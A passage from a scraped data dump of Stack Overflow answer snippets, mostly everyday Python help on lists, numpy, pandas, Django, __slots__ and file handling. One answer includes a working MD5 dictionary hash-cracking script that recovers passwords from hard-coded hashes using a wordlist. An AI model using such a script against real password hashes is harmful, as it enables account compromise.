</snippet></ROW><ROW><id>20328673</id><snippet>list.count</snippet></ROW><ROW><id>20328673</id><snippet>slicing</snippet></ROW><ROW><id>20328673</id><snippet>&gt;&gt;&gt; lis = [0, 0, 0, 0, 0, 120, 120, 120, 120, 120, 240, 240, 240, 240, 240, 0, 0, 0, 0, 0, 120, 120, 120, 120, 120]
&gt;&gt;&gt; lis[14:].count(0)
5
&gt;&gt;&gt; lis[14:17].count(0)
2
</snippet></ROW><ROW><id>20328673</id><snippet>sum</snippet></ROW><ROW><id>20328673</id><snippet>list.count</snippet></ROW><ROW><id>20328673</id><snippet>&gt;&gt;&gt; sum(1 for i in xrange(14, len(lis)) if lis[i]==0)
5
&gt;&gt;&gt; sum(1 for i in xrange(14, 17) if lis[i]==0)
2
</snippet></ROW><ROW><id>20328673</id><snippet>In [4]: lis = [0, 0, 0, 0, 0, 120, 120, 120, 120, 120, 240, 240, 240, 240, 240, 0, 0, 0, 0, 0, 12
0, 120, 120, 120, 120]*10**5                                                                     

In [5]: %timeit lis[14:].count(0)                                                                
10 loops, best of 3: 64.7 ms per loop

In [6]: %timeit sum(1 for i in xrange(14, len(lis)) if lis[i]==0)                                
1 loops, best of 3: 307 ms per loop
</snippet></ROW><ROW><id>20328838</id><snippet>colors = { "WH": (255, 255, 255),
           "RE": (255, 0, 0),
         }
</snippet></ROW><ROW><id>20328838</id><snippet>-c</snippet></ROW><ROW><id>20328838</id><snippet>pygame.draw.line(screen, colors[args.colour], (nSX), (nSY), (nEX,nEY), 1)
</snippet></ROW><ROW><id>20329127</id><snippet>_wfopen()</snippet></ROW><ROW><id>20329127</id><snippet>open()</snippet></ROW><ROW><id>20329127</id><snippet>_wopen()</snippet></ROW><ROW><id>20329127</id><snippet>io.open()</snippet></ROW><ROW><id>20329127</id><snippet>msvcrt.open_osfhandle()</snippet></ROW><ROW><id>20329127</id><snippet>sharing</snippet></ROW><ROW><id>20329127</id><snippet>import os
import msvcrt
import _winapi

CREATE_NEW                  = 1
CREATE_ALWAYS               = 2
OPEN_EXISTING               = 3
OPEN_ALWAYS                 = 4
TRUNCATE_EXISTING           = 5
FILE_SHARE_READ             = 0x00000001
FILE_SHARE_WRITE            = 0x00000002
FILE_SHARE_DELETE           = 0x00000004
FILE_SHARE_VALID_FLAGS      = 0x00000007
FILE_ATTRIBUTE_READONLY     = 0x00000001
FILE_ATTRIBUTE_NORMAL       = 0x00000080
FILE_ATTRIBUTE_TEMPORARY    = 0x00000100
FILE_FLAG_DELETE_ON_CLOSE   = 0x04000000
FILE_FLAG_SEQUENTIAL_SCAN   = 0x08000000
FILE_FLAG_RANDOM_ACCESS     = 0x10000000
GENERIC_READ                = 0x80000000
GENERIC_WRITE               = 0x40000000
DELETE                      = 0x00010000
NULL                        = 0

_ACCESS_MASK = os.O_RDONLY | os.O_WRONLY | os.O_RDWR
_ACCESS_MAP  = {os.O_RDONLY : GENERIC_READ,
                os.O_WRONLY : GENERIC_WRITE,
                os.O_RDWR   : GENERIC_READ | GENERIC_WRITE}

_CREATE_MASK = os.O_CREAT | os.O_EXCL | os.O_TRUNC
_CREATE_MAP  = {0                                   : OPEN_EXISTING,
                os.O_EXCL                           : OPEN_EXISTING,
                os.O_CREAT                          : OPEN_ALWAYS,
                os.O_CREAT | os.O_EXCL              : CREATE_NEW,
                os.O_CREAT | os.O_TRUNC | os.O_EXCL : CREATE_NEW,
                os.O_TRUNC                          : TRUNCATE_EXISTING,
                os.O_TRUNC | os.O_EXCL              : TRUNCATE_EXISTING,
                os.O_CREAT | os.O_TRUNC             : CREATE_ALWAYS}


def os_open(file, flags, mode=0o777,
            *, share_flags=FILE_SHARE_VALID_FLAGS):
    '''
    Replacement for os.open() allowing moving or unlinking before closing
    '''
    if not isinstance(flags, int) and mode &gt;= 0:
        raise ValueError('bad flags: %r' % flags)

    if not isinstance(mode, int) and mode &gt;= 0:
        raise ValueError('bad mode: %r' % mode)

    if share_flags &amp; ~FILE_SHARE_VALID_FLAGS:
        raise ValueError('bad share_flags: %r' % share_flags)

    access_flags = _ACCESS_MAP[flags &amp; _ACCESS_MASK]
    create_flags = _CREATE_MAP[flags &amp; _CREATE_MASK]
    attrib_flags = FILE_ATTRIBUTE_NORMAL

    if flags &amp; os.O_CREAT and mode &amp; ~0o444 == 0:
        attrib_flags = FILE_ATTRIBUTE_READONLY

    if flags &amp; os.O_TEMPORARY:
        share_flags |= FILE_SHARE_DELETE
        attrib_flags |= FILE_FLAG_DELETE_ON_CLOSE
        access_flags |= DELETE

    if flags &amp; os.O_SHORT_LIVED:
        attrib_flags |= FILE_ATTRIBUTE_TEMPORARY

    if flags &amp; os.O_SEQUENTIAL:
        attrib_flags |= FILE_FLAG_SEQUENTIAL_SCAN

    if flags &amp; os.O_RANDOM:
        attrib_flags |= FILE_FLAG_RANDOM_ACCESS

    h = _winapi.CreateFile(file, access_flags, share_flags, NULL,
                           create_flags, attrib_flags, NULL)
    return msvcrt.open_osfhandle(h, flags | os.O_NOINHERIT)
</snippet></ROW><ROW><id>20329163</id><snippet>requirements.txt</snippet></ROW><ROW><id>20329206</id><snippet>from subprocess import Popen
Popen('gdb a.out', shell=True).communicate()
print 'test'
</snippet></ROW><ROW><id>20329745</id><snippet>isdigit</snippet></ROW><ROW><id>20329745</id><snippet>True</snippet></ROW><ROW><id>20329745</id><snippet>False</snippet></ROW><ROW><id>20329745</id><snippet>if ch.isdigit():
</snippet></ROW><ROW><id>20329745</id><snippet>if pw[:2].isdigit():
    digit = True
for ch in pw:
    ...
</snippet></ROW><ROW><id>20329745</id><snippet>if not pw.find(' '):
    no_blanks = True
</snippet></ROW><ROW><id>20329745</id><snippet>import string
...
if not any(c in string.whitespace for c in pw):
    no_blanks = True
for ch in pw:
   ...
</snippet></ROW><ROW><id>20329778</id><snippet>&gt;&gt;&gt; gp = np.array(goodPix, np.float)
&gt;&gt;&gt; np.mean(gp)
96.906260000000003
</snippet></ROW><ROW><id>20330116</id><snippet>in</snippet></ROW><ROW><id>20330116</id><snippet>with open("N:\highscores.txt", "r") as scoresfile:
    scores = {name.strip(): score.strip() for line in scoresfile if ':' in line for name, score in (line.split(':'),)}

if name in scores:
    print("You have already entered a score.")
else:
    with open("N:\highscores.txt", "a") as scoresfile:
        file.write('{} : {}\n'.format(name, score))
</snippet></ROW><ROW><id>20330116</id><snippet>w</snippet></ROW><ROW><id>20330228</id><snippet>mysql&gt; create table x (i int, j int, primary key (i), unique key (j));
mysql&gt; insert into x (i,j) values (NULL,NULL);
ERROR 1048 (23000): Column 'i' cannot be null
mysql&gt; insert into x (i,j) values (1,NULL);
mysql&gt; insert into x (i,j) values (2,NULL);
mysql&gt; insert into x (i,j) values (3,3);
mysql&gt; select * from x;
+---+------+
| i | j    |
+---+------+
| 1 | NULL |
| 2 | NULL |
| 3 |    3 |
+---+------+
3 rows in set (0.01 sec)

mysql&gt; insert into x (i,j) values (4,3);
ERROR 1062 (23000): Duplicate entry '3' for key 'j'
</snippet></ROW><ROW><id>20330228</id><snippet>not null</snippet></ROW><ROW><id>20330228</id><snippet>null=True</snippet></ROW><ROW><id>20330228</id><snippet>unique_together = (("field1", "field2"),)</snippet></ROW><ROW><id>20330324</id><snippet>import glob

class ClassB():
    def myfunction(self):
        print 'hello'

if __name__ == '__main__':
    libs = [item[:-3] for item in glob.glob("*.py")]
    print '***************************************************'
    print '* Menu'
    for item in libs :
      print '** ' + item
    print '***************************************************'

    while True:
        module_name = raw_input("&gt;&gt;&gt; ")
        if module_name != "":
            if module_name == 'exit':
              break 
            if module_name in libs: 
              lib = __import__(module_name)
              class_ = getattr(lib, 'ClassB')
              theclass = class_()
              theclass.myfunction() 
              break   
            else:
              print 'Module does not exist' 
</snippet></ROW><ROW><id>20330338</id><snippet>import datetime
from django.views.decorators.cache import cache_page


def my_cache(time_func, *args, **kwargs):
    def decorator(func):
        def wraps(*args, **kwargs):
            @cache_page(time_func())
            def inner_func(*args, **kwargs):
                return func(*args, **kwargs)    
            return inner_func(*args, **kwargs)
        return wraps
    return decorator


def till_hour():
    now = datetime.datetime.now()
    return (60 - now.minute) * 60 + (60 - now.second)


@my_cache(time_func=till_hour)
def my_view(request):
    ... # view code_here
</snippet></ROW><ROW><id>20330338</id><snippet>time_func</snippet></ROW><ROW><id>20330338</id><snippet>cache_page</snippet></ROW><ROW><id>20331132</id><snippet>&lt;input&gt;</snippet></ROW><ROW><id>20331132</id><snippet>name</snippet></ROW><ROW><id>20331331</id><snippet>if len(pw) &gt;= 8:
   correct_length = True
</snippet></ROW><ROW><id>20331331</id><snippet>if len(pw) &lt; 8:
   correct_length = False
   print "Password not lengthy"
</snippet></ROW><ROW><id>20331367</id><snippet>a[0]['node1'][0]</snippet></ROW><ROW><id>20331367</id><snippet>a[0][0]</snippet></ROW><ROW><id>20331367</id><snippet>{'node1':[1,2,3]}</snippet></ROW><ROW><id>20331496</id><snippet>prod['A'][(prod['A'] &lt; targetA['A']) &amp; (prod['A'] &gt; targetB['A'])]
</snippet></ROW><ROW><id>20331576</id><snippet>pl.axis('tight')</snippet></ROW><ROW><id>20331576</id><snippet>xlim</snippet></ROW><ROW><id>20331576</id><snippet>pl.axis('tight')</snippet></ROW><ROW><id>20331579</id><snippet>rects1 = ax.bar(ind, (dic[key] for key in dic.keys()), width, color='r')
</snippet></ROW><ROW><id>20331579</id><snippet>rects1 = ax.bar(ind, dic.values(), width, color='r')
</snippet></ROW><ROW><id>20331579</id><snippet>dic={'a':(1,2),'b':(2,2),'c':(3,2)}
</snippet></ROW><ROW><id>20331579</id><snippet>(1, 2, 3)</snippet></ROW><ROW><id>20331579</id><snippet>rects1 = ax.bar(ind, sorted(set(dic.values())), width, color='r')
</snippet></ROW><ROW><id>20331775</id><snippet>__slots__</snippet></ROW><ROW><id>20331775</id><snippet>class Foo(object):
    __slots__ = ['bar']
    def __init__(self, bar_value):
        self.barr = bar_value

the_foo = Foo('bar value')
# AttributeError: 'Foo' object has no attribute 'barr'
</snippet></ROW><ROW><id>20331775</id><snippet>__slots__</snippet></ROW><ROW><id>20331775</id><snippet>__dict__</snippet></ROW><ROW><id>20331775</id><snippet>__weakref__</snippet></ROW><ROW><id>20331921</id><snippet>xlrd</snippet></ROW><ROW><id>20331921</id><snippet>&gt;&gt;&gt; from xlrd import *
&gt;&gt;&gt; wb = open_workbook("test.xls")
&gt;&gt;&gt; sheet = wb.sheet_by_index(0)
&gt;&gt;&gt; notes = sheet.cell_note_map
&gt;&gt;&gt; print notes
{(0, 0): &lt;xlrd.sheet.Note object at 0x00000000033FE9E8&gt;}
&gt;&gt;&gt; notes[0,0].text
u'Schmo, Joe:\nHi!'
</snippet></ROW><ROW><id>20331921</id><snippet>xlrd</snippet></ROW><ROW><id>20331921</id><snippet>wb</snippet></ROW><ROW><id>20331921</id><snippet>sheet</snippet></ROW><ROW><id>20331921</id><snippet>notes</snippet></ROW><ROW><id>20331921</id><snippet>cell_note_map</snippet></ROW><ROW><id>20331921</id><snippet>text</snippet></ROW><ROW><id>20331921</id><snippet>&gt;&gt;&gt; comments = []
&gt;&gt;&gt; for key in notes.keys():
...     comments.append(notes[key].text)
...
&gt;&gt;&gt; print comments
[u"Schmo, Joe:\nHere's another\n", u'Schmo, Joe:\nhi!']
</snippet></ROW><ROW><id>20331921</id><snippet>.xls</snippet></ROW><ROW><id>20331921</id><snippet>.xlsx</snippet></ROW><ROW><id>20331921</id><snippet>.xlsx</snippet></ROW><ROW><id>20331921</id><snippet>.xls</snippet></ROW><ROW><id>20331921</id><snippet>author</snippet></ROW><ROW><id>20331921</id><snippet>text</snippet></ROW><ROW><id>20331921</id><snippet>\n</snippet></ROW><ROW><id>20331921</id><snippet>cell_note_map</snippet></ROW><ROW><id>20332032</id><snippet>x</snippet></ROW><ROW><id>20332032</id><snippet>foo()</snippet></ROW><ROW><id>20332032</id><snippet>x</snippet></ROW><ROW><id>20332032</id><snippet>x = 0

def foo():
    global x
    x = x + 1

print(x)
foo()
print(x)
</snippet></ROW><ROW><id>20332032</id><snippet>def foo(value):
    return value + 1

x = 0
print(x)
x = foo(x)
print(x)
</snippet></ROW><ROW><id>20332350</id><snippet>bin</snippet></ROW><ROW><id>20332350</id><snippet>&gt;&gt;&gt; bin(7)
'0b111'
&gt;&gt;&gt; bin(9)
'0b1001'
</snippet></ROW><ROW><id>20332448</id><snippet>scipy</snippet></ROW><ROW><id>20332448</id><snippet>bsub</snippet></ROW><ROW><id>20332646</id><snippet>numpy</snippet></ROW><ROW><id>20332646</id><snippet>&gt;&gt;&gt; data = np.array([ [0, 1], [2,3] ])
&gt;&gt;&gt; data[:,0]
array([0, 2])
</snippet></ROW><ROW><id>20332646</id><snippet>data[:][0]
</snippet></ROW><ROW><id>20332646</id><snippet>data[0][:]
</snippet></ROW><ROW><id>20332681</id><snippet>a = [{'node1':[1,2,3]},
     {'node2':[4,5,6]},
     {'node3':[7,8,9]},
     {'node4':['a','b','c']}]
</snippet></ROW><ROW><id>20332681</id><snippet>for dict in a:
    for key,list in dict.iteritems():
        print '{} : {}'.format(key,list)
</snippet></ROW><ROW><id>20332681</id><snippet>for dict in a:
    for key,list in dict.items():
        print('{} : {}'.format(key,list))
</snippet></ROW><ROW><id>20332681</id><snippet>node1 : [1, 2, 3]
node2 : [4, 5, 6]
node3 : [7, 8, 9]
node4 : ['a', 'b', 'c']
</snippet></ROW><ROW><id>20332745</id><snippet>ds['Label']</snippet></ROW><ROW><id>20332745</id><snippet>ax1.scatter</snippet></ROW><ROW><id>20332745</id><snippet>colors = {'A': 'b','B': 'purple', 'C': 'r','D' : 'grey','E' : 'green', 'F' : 'magenta'}
size= 1000

fig1, ax1 = plt.subplots(figsize=(10,8))

for t in ('A','B','C'):
    ax1.scatter(ds[ds['Label']==t]['factor2'], ds[ds['Label']==t]['factor1'], 
                color=colors[t], 
                label=t,
                s=size, 
                alpha=0.7)

for label, x, y in zip(ds['Year'], ds['factor2'], ds['factor1']):
    ax1.annotate(label, xy = (x + 0.008, y - 0.003),fontsize = 15)
ax1.legend(markerscale=0.2)
</snippet></ROW><ROW><id>20332906</id><snippet>\n</snippet></ROW><ROW><id>20332906</id><snippet>label4Text.set("0.0.0.0\nThis subnet mask is non-routable\nas there is no network portion")
</snippet></ROW><ROW><id>20332906</id><snippet>In [4]: s = "0.0.0.0 \nThis subnet mask is non-routable\nThere is no network portion"

In [5]: print s
0.0.0.0 
This subnet mask is non-routable
There is no network portion
</snippet></ROW><ROW><id>20332994</id><snippet>import hashlib
hash_to_crack = "5badcaf789d3d1d09794d8f021f40f0e"
dict_file = "dict.txt"

def main():
    with open(dict_file) as fileobj:
        for line in fileobj:
            line = line.strip()
            if hashlib.md5(line).hexdigest() == hash_to_crack:
                print "Successfully cracked the hash %s: It's %s" % (hash_to_crack, line)
                return ""
    print "Failed to crack the file."

if __name__ == "__main__":
    main()
</snippet></ROW><ROW><id>20332994</id><snippet>import hashlib
hashes_to_crack = ["5badcaf789d3d1d09794d8f021f40f0e", "d0763edaa9d9bd2a9516280e9044d885", "8621ffdbc5698829397d97767ac13db3"]
dict_file = "dict.txt"

def main(hash_to_crack):
    with open(dict_file) as fileobj:
        for line in fileobj:
            line = line.strip()
            if hashlib.md5(line).hexdigest() == hash_to_crack:
                print "Successfully cracked the hash %s: It's %s" % (hash_to_crack, line)
                return ""
    print "Failed to crack the file."

if __name__ == "__main__":
    for hashToCrack in hashes_to_crack:
        main(hashToCrack)
</snippet></ROW><ROW><id>20333146</id><snippet>list(b)</snippet></ROW><ROW><id>20333146</id><snippet>&gt;&gt;&gt; a[np.in1d(a[:,2], list(b))]
array([[   430,    382, 121486,      2],
       [   451,    412, 153521,      2],
       [   607,    567, 121473,      2]])
</snippet></ROW><ROW><id>20333146</id><snippet>np.in1d</snippet></ROW><ROW><id>20333146</id><snippet>&gt;&gt;&gt; np.in1d(a[:,2], list(b))
array([False,  True,  True, False, False, False, False,  True, False], dtype=bool)
</snippet></ROW><ROW><id>20333146</id><snippet>a</snippet></ROW><ROW><id>20333146</id><snippet>b</snippet></ROW><ROW><id>20333146</id><snippet>b</snippet></ROW><ROW><id>20333146</id><snippet>a</snippet></ROW><ROW><id>20333146</id><snippet>b</snippet></ROW><ROW><id>20333146</id><snippet>np.in1d</snippet></ROW><ROW><id>20333146</id><snippet>ainb = np.array([x in b for x in a[:,2]])
a[ainb]
</snippet></ROW><ROW><id>20333146</id><snippet>a</snippet></ROW><ROW><id>20333146</id><snippet>b</snippet></ROW><ROW><id>20333429</id><snippet>def post(self):
    var_dump({ k: self.get_argument(k) for k in self.request.arguments }) 
</snippet></ROW><ROW><id>20333668</id><snippet>def pageView(request, url):
    page = ArticlePage.objects.get(slug=url)
    ...
    return page.content
</snippet></ROW><ROW><id>20333668</id><snippet>urlpatterns += patterns('articles.views',
    (r'^(?P&lt;url&gt;.+?)/$', 'pageView'),
) #Catch all URLs not yet matched and attempt to find them in the database.
</snippet></ROW><ROW><id>20333668</id><snippet>urls.py</snippet></ROW><ROW><id>20333668</id><snippet>urls.py</snippet></ROW><ROW><id>20333668</id><snippet>from django.views.generic import TemplateView

urlpatterns = patterns('',
    (r'^foo/$', TemplateView.as_view(template_name='foo.html')),
)
</snippet></ROW><ROW><id>20333748</id><snippet>&gt;&gt;&gt; dic={10:(1,4),20:(2,4),30:(3,4)}
&gt;&gt;&gt; [x[0] for x in dic.values()]
[1, 2, 3]
&gt;&gt;&gt; # Or if you want that as a tuple
&gt;&gt;&gt; tuple(x[0] for x in dic.values())
(1, 2, 3)
&gt;&gt;&gt; # Or a string
&gt;&gt;&gt; ",".join([str(x[0]) for x in dic.values()])
'1,2,3'
&gt;&gt;&gt;
</snippet></ROW><ROW><id>20333748</id><snippet>sorted</snippet></ROW><ROW><id>20333767</id><snippet>QtGui.QPixmap</snippet></ROW><ROW><id>20333767</id><snippet>grabWindow()</snippet></ROW><ROW><id>20333767</id><snippet>pixmap = QPixmap.grabWindow(QApplication.desktop().winId())
</snippet></ROW><ROW><id>20333767</id><snippet>QRubberband</snippet></ROW><ROW><id>20333767</id><snippet>QPixmap.copy()</snippet></ROW><ROW><id>20333767</id><snippet>QPixmap.save()</snippet></ROW><ROW><id>20333781</id><snippet>get_chunck</snippet></ROW><ROW><id>20333894</id><snippet>&amp;</snippet></ROW><ROW><id>20333894</id><snippet>==</snippet></ROW><ROW><id>20333894</id><snippet>my_df.ix[(my_df.CHUNK_NAME==chunks[0])&amp;(my_df.LAMBDA==lam_beta[0][0])]
         ^                           ^ ^                            ^
</snippet></ROW><ROW><id>20334146</id><snippet># Put this after your existing code
newline = doc.createTextNode('\n')
calcSequence.insertBefore(newline, entrys[2])
</snippet></ROW><ROW><id>20334325</id><snippet>main</snippet></ROW><ROW><id>20334325</id><snippet>multiprocessing</snippet></ROW><ROW><id>20334325</id><snippet>select</snippet></ROW><ROW><id>20334562</id><snippet>def func(string):
    for i in range(len(string) - 1):
        if string[i] == string[i+1]:
            j = i + 1
            while j &lt; len(string) and string[j] == string[i]:
                j += 1
            return func(string[:i] + string[j:])
    return string
</snippet></ROW><ROW><id>20334657</id><snippet>ans = 0</snippet></ROW><ROW><id>20334657</id><snippet>def sin(x):
    ans = 0
    for n in range(4):
        ans += (math.pow(-1, n)/math.factorial(2*n + 1)) * math.pow(x, 2*n + 1)
    print ans
</snippet></ROW><ROW><id>20334657</id><snippet>def sin(x, terms=4):
    ans = 0
    for n in range(terms):
        ans += (math.pow(-1, n)/math.factorial(2*n + 1)) * math.pow(x, 2*n + 1)
    return ans
</snippet></ROW><ROW><id>20334657</id><snippet>def sin(x, terms=4):
    return sum(
            (-1.)**n / math.factorial(2*n + 1) * math.pow(x, 2*n + 1)
        for n in range(terms))
</snippet></ROW><ROW><id>20334657</id><snippet>print sin(x)</snippet></ROW><ROW><id>20334755</id><snippet>1. driver.find_element_by_id("id of textbox").clear()

or 2. driver.find_element_by_css_selector("#...").clear()

etc etc
</snippet></ROW><ROW><id>20334755</id><snippet>driver.switch_to_frame("frame name") #switch to the iframe

#do what you want to do inside the iframe. for example: 
driver.find_element_by_id("textbox id").clear() #clear the textbox
#write something to the textbox

driver.switch_to_default_content() #switch back from the iframe when you're done
</snippet></ROW><ROW><id>20334911</id><snippet>myList = [1,2,3,4]

with open('path/to/output', 'w') as outfile:
  outfile.write('\n'.join(str(i) for i in myList))
</snippet></ROW><ROW><id>20334911</id><snippet>int</snippet></ROW><ROW><id>20334911</id><snippet>list</snippet></ROW><ROW><id>20334911</id><snippet>dict</snippet></ROW><ROW><id>20334915</id><snippet>ln -s /usr/local/Cellar/freetype/2.5.1/include/freetype2 /usr/local/include/freetype
</snippet></ROW><ROW><id>20334936</id><snippet>from modulename import *</snippet></ROW><ROW><id>20334936</id><snippet>__all__</snippet></ROW><ROW><id>20334936</id><snippet>os</snippet></ROW><ROW><id>20334936</id><snippet>__all__</snippet></ROW><ROW><id>20334936</id><snippet>import os
from .implementation import some_other_api_call

_module_path = os.path.dirname(os.path.abspath(__file__))
_template = open(os.path.join(_module_path, 'templates/foo_template.txt')).read()

VERSION = '1.0.0'

def make_bar(baz, ham, spam):
    return _template.format(baz, ham, spam)

__all__ = ['some_other_api_call', 'make_bar']
</snippet></ROW><ROW><id>20334936</id><snippet>__all__</snippet></ROW><ROW><id>20334936</id><snippet>some_other_api_call</snippet></ROW><ROW><id>20334936</id><snippet>os</snippet></ROW><ROW><id>20334936</id><snippet>from ... import *</snippet></ROW><ROW><id>20334936</id><snippet>import os as _os</snippet></ROW><ROW><id>20335042</id><snippet>import string

def buildCoder(shift):
mydict = {'A':'A','B':'B','C':'C','D':'D','E':'E','F':'F','G':'G','H':'H','I':'I','J':'J','K':'K','L':'L','M':'M','N':'N','O':'O','P':'P','Q':'Q','R':'R','S':'S','T':'T','U':'U','V':'V','W':'W','X':'X','Y':'Y','Z':'Z','a':'a','b':'b','c':'c','d':'d','e':'e','f':'f','g':'g','h':'h','i':'i','j':'j','k':'k','l':'l','m':'m','n':'n','o':'o','p':'p','q':'q','r':'r','s':'s','t':'t','u':'u','v':'v','w':'w','x':'x','y':'y','z':'z'} 
for value in mydict:
    if value in string.ascii_uppercase:
        valIndex = string.ascii_uppercase.find(value)
        newVal = string.ascii_uppercase[((valIndex + shift) % 26)]
        newdict[value] = newVal
    elif value in string.ascii_lowercase:
        valIndex = string.ascii_lowercase.find(value)
        newVal = string.ascii_lowercase[((valIndex + shift) % 26)]
        newdict[value] = newVal
return newdict
</snippet></ROW><ROW><id>20335079</id><snippet>operator.itemgetter</snippet></ROW><ROW><id>20335079</id><snippet>apple, grape = itemgetter('apple', 'grape')(foodColors())
</snippet></ROW><ROW><id>20335079</id><snippet>getter = itemgetter('apple', 'grape')
apple, grape = getter(foodColors())
apple2, grape2 = getter(foodColors())
</snippet></ROW><ROW><id>20335156</id><snippet>"call connectAlert for me"</snippet></ROW><ROW><id>20335156</id><snippet>if data == "call connectAlert for me": connectAlert(..)</snippet></ROW><ROW><id>20335156</id><snippet>Mastermind</snippet></ROW><ROW><id>20335156</id><snippet>chat_client.py</snippet></ROW><ROW><id>20335156</id><snippet>MastermindClientTCP</snippet></ROW><ROW><id>20335156</id><snippet>chat_server.py</snippet></ROW><ROW><id>20335156</id><snippet>MastermindServerTCP</snippet></ROW><ROW><id>20335280</id><snippet>Pycharm</snippet></ROW><ROW><id>20335280</id><snippet>Run</snippet></ROW><ROW><id>20335280</id><snippet>Edit Configurations...</snippet></ROW><ROW><id>20335280</id><snippet>.py</snippet></ROW><ROW><id>20335280</id><snippet>Environment variables</snippet></ROW><ROW><id>20335280</id><snippet>...</snippet></ROW><ROW><id>20335280</id><snippet>+</snippet></ROW><ROW><id>20335280</id><snippet>PATH</snippet></ROW><ROW><id>20335280</id><snippet>/usr/local/bin</snippet></ROW><ROW><id>20335280</id><snippet>Include print environment variables</snippet></ROW><ROW><id>20335294</id><snippet>os.rename("C:/test/temp/" + filename, "C:/test/temp/" + filename[:len(filename)-10]+".jpg")
</snippet></ROW><ROW><id>20335347</id><snippet>RZ</snippet></ROW><ROW><id>20335347</id><snippet>&gt;&gt;&gt; list(zip(*sorted(zip(*lst), key=lambda x: x[2])))
[('3', '1', '2', '4'), ('some text 3', 'some text 1', 'some text 2', 'some text 4'), ('some RZ-text to analyze', 'some text', 'some text to analyze with RZstring', 'some text to analyze with no rz-string and no textRZ')]
</snippet></ROW><ROW><id>20335347</id><snippet>RZ</snippet></ROW><ROW><id>20335347</id><snippet>RZ</snippet></ROW><ROW><id>20335347</id><snippet>\b</snippet></ROW><ROW><id>20335347</id><snippet>&gt;&gt;&gt; import re
&gt;&gt;&gt; list(zip(*sorted(zip(*lst), key=lambda x: (re.search(r'\bRZ', x[2]) != None, x[2]))))
[('1', '4', '3', '2'), ('some text 1', 'some text 4', 'some text 3', 'some text 2'), ('some text', 'some text to analyze with no rz-string and no textRZ', 'some RZ-text to analyze', 'some text to analyze with RZstring')]
</snippet></ROW><ROW><id>20335383</id><snippet>category_list = Category.objects.order_by('-likes')[:5]
</snippet></ROW><ROW><id>20335383</id><snippet>Category</snippet></ROW><ROW><id>20335383</id><snippet>likes</snippet></ROW><ROW><id>20335383</id><snippet>id</snippet></ROW><ROW><id>20335383</id><snippet>name</snippet></ROW><ROW><id>20335383</id><snippet>page</snippet></ROW><ROW><id>20335439</id><snippet>[669,'ldn','10']</snippet></ROW><ROW><id>20335439</id><snippet>'10' != 10</snippet></ROW><ROW><id>20335439</id><snippet>&gt;&gt;&gt; mergedTable.radius = mergedTable.radius.astype(int)
&gt;&gt;&gt; mergedTable.drop_duplicates()
   subscriber_id      title location  radius
0            262   director       ny      20
1            515     artist    paris      19
2            669  scientist      ldn      10
4            669  scientist      ldn       5
</snippet></ROW><ROW><id>20335562</id><snippet>outfile.write(struct.pack('=didi', 1.2, 1, 1.3, 2))
</snippet></ROW><ROW><id>20335562</id><snippet>0000000 3333 3333 3333 3ff3 0001 0000 cccd cccc
0000010 cccc 3ff4 0002 0000                    
</snippet></ROW><ROW><id>20335562</id><snippet>testdouble: 1.200000, testint: 1, testdouble: 1.300000, testinttwo: 2
</snippet></ROW><ROW><id>20335562</id><snippet>struct D {
    double td;
    int ti;
    double td2;
   int ti2;
};


struct D d;
fread(&amp;d, sizeof(struct D), 1, f);
fprintf(stderr, "testdouble: %f, testint: %d, testdouble: %f, testinttwo: %d", d.td, d.ti, d.td2, d.ti2);
</snippet></ROW><ROW><id>20335589</id><snippet>parser=argparse.ArgumentParser()
parser.add_argument('-f',metavar="TEST",choices=('a','b','c'),
    help='choices, {%(choices)s}')
print parser.format_help()
</snippet></ROW><ROW><id>20335589</id><snippet>usage: stack20328931.py [-h] [-f TEST]

optional arguments:
  -h, --help  show this help message and exit
  -f TEST     choices, {a, b, c}
</snippet></ROW><ROW><id>20335652</id><snippet>Bezier([a, b, c], t) == Bezier([c, b, a], 1.-t)</snippet></ROW><ROW><id>20335652</id><snippet>def Bezier(point_list, t):
    if len(point_list)==1:
        return point_list[0]
    else:
        P1=Bezier(point_list[0:-1], t)
        P2=Bezier(point_list[1:], t)
        nt = 1. - t
        return (nt * P1[0] + t * P2[0], nt * P1[1] + t * P2[1])
</snippet></ROW><ROW><id>20335703</id><snippet>\d</snippet></ROW><ROW><id>20335703</id><snippet>&gt;&gt;&gt; import re
&gt;&gt;&gt; g = "C0N4rtist"
&gt;&gt;&gt; re.sub(r'\d+', '', g)
'CNrtist'
</snippet></ROW><ROW><id>20335703</id><snippet>str.translate</snippet></ROW><ROW><id>20335703</id><snippet>&gt;&gt;&gt; from string import digits
&gt;&gt;&gt; g.translate(None, digits)
'CNrtist'
</snippet></ROW><ROW><id>20335703</id><snippet>&gt;&gt;&gt; g = "C0N4rtist"*100
&gt;&gt;&gt; %timeit g.translate(None, digits)      #winner
100000 loops, best of 3: 9.98 us per loop
&gt;&gt;&gt; %timeit ''.join(i for i in g if not i.isdigit())
1000 loops, best of 3: 507 us per loop
&gt;&gt;&gt; %timeit re.sub(r'\d+', '', g)
1000 loops, best of 3: 253 us per loop
&gt;&gt;&gt; %timeit ''.join([i for i in g if not i.isdigit()])
1000 loops, best of 3: 352 us per loop
&gt;&gt;&gt; %timeit ''.join([i for i in g if i not in digits])
1000 loops, best of 3: 277 us per loop
</snippet></ROW><ROW><id>20335858</id><snippet>from collections import Counter
import sys
from random import randint

# Python 2/3 compatibility
if sys.hexversion &gt;= 0x3000000:
    inp = input
    rng = range
else:
    inp = raw_input
    rng = xrange

def get_int(prompt):
    while True:
        try:
            return int(inp(prompt))
        except ValueError:
            pass

def main():
    sides = get_int("How many sides does your die have? ")
    times = get_int("How many times do you want to roll? ")
    results = Counter(randint(1, sides) for roll in rng(times))

if __name__=="__main__":
    main()
</snippet></ROW><ROW><id>20335892</id><snippet>t</snippet></ROW><ROW><id>20335892</id><snippet>Test</snippet></ROW><ROW><id>20335892</id><snippet>__slots__</snippet></ROW><ROW><id>20335892</id><snippet>__slots__</snippet></ROW><ROW><id>20335892</id><snippet>&gt;&gt;&gt; class Test(object):
...     __slots__ = ['a']
...
&gt;&gt;&gt; t = Test()
&gt;&gt;&gt; t.a = "Hello"
&gt;&gt;&gt; t.b = "World"
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
AttributeError: 'Test' object has no attribute 'b'
</snippet></ROW><ROW><id>20335954</id><snippet>COMSPEC</snippet></ROW><ROW><id>20335954</id><snippet>&gt;&gt;&gt; import os
&gt;&gt;&gt; os.environ['COMSPEC']
'C:\\Windows\\system32\\cmd.exe'
&gt;&gt;&gt; import subprocess
&gt;&gt;&gt; subprocess.call('dir', shell=True)

    (normal output here)

